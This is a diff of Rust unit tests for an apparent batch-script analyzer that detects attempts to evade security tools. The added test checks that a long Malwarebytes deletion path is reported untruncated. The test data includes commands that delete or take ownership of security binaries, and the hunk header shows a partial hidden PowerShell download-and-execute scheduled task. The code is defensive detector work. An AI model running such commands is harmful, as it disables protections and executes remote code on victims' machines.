@@ -2717,6 +2717,26 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn security_product_remove_target_is_not_truncated() {
+        let long_marker = "tail-marker-preserved-in-security-product-remove";
+        let script = format!(
+            "del /f /q \"C:\\Program Files\\Malwarebytes\\{}\\{long_marker}\\mbam.exe\"\r\n",
+            "nested-path-segment".repeat(12)
+        );
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "security-product-remove" && target.contains(long_marker)
+            )),
+            "security product removal target was truncated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn defender_security_binary_tampering_emits_evasion_traits() {
         let script = b"@echo off\r\n\
             takeown /f \"C:\\Windows\\System32\\SecurityHealthService.exe\"\r\n\
